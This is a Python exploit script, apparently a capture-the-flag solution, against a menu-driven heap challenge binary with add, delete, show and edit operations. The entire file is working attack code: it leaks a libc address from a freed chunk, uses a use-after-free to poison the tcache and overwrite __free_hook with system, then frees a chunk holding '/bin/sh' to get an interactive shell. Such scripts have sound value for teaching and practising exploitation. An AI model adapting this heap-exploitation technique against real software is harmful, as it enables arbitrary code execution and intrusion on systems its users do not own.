#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()
set_remote_libc("libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc


def cmd(choice):
    # ru(b">")
    sl(i2b(choice))


def add(idx, size):
    cmd(1)
    ru(b"Where? ")
    sl(i2b(idx))
    ru(b"size? ")
    sl(i2b(size))


def delet(idx):
    cmd(2)
    ru(b"Where? ")
    sl(i2b(idx))


def show(idx):
    cmd(3)
    ru(b"Where? ")
    sl(i2b(idx))


def edit(idx, size, data):
    cmd(4)
    ru(b"Where? ")
    sl(i2b(idx))
    ru(b"size? ")
    sl(i2b(size))
    s(data)


add(0, 0x100)
add(1, 0x100)
add(2, 0x100)
add(3, 0x520)
add(4, 0x100)

delet(1)
delet(0)
delet(3)
show(3)
libc_base = u64_ex(rn(6)) - 0x3AFCA0
lg("libc_base", libc_base)
edit(0, 0x100, p64(libc_base + libc.sym.__free_hook))


def add(idx, size):
    cmd(1)
    # ru(b"Where? ")
    sl(i2b(idx))
    # ru(b"size? ")
    sl(i2b(size))


add(5, 0x100)
add(6, 0x100)
edit(6, 0x100, p64(libc_base + libc.sym.system))
edit(5, 0x100, b"/bin/sh\x00")
delet(5)


ia()
